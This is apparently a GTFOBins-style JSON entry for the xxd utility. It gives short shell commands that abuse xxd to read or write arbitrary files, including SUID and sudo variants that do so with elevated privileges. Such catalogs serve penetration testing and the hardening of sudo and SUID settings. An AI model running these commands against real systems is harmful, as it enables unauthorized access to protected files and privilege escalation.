{
  "functions": {
    "file-write": [
      {
        "description": "",
        "code": "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n"
      }
    ],
    "file-read": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nxxd \"$LFILE\" | xxd -r\n"
      }
    ],
    "suid": [
      {
        "description": "",
        "code": "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
      }
    ],
    "sudo": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
      }
    ]
  }
}
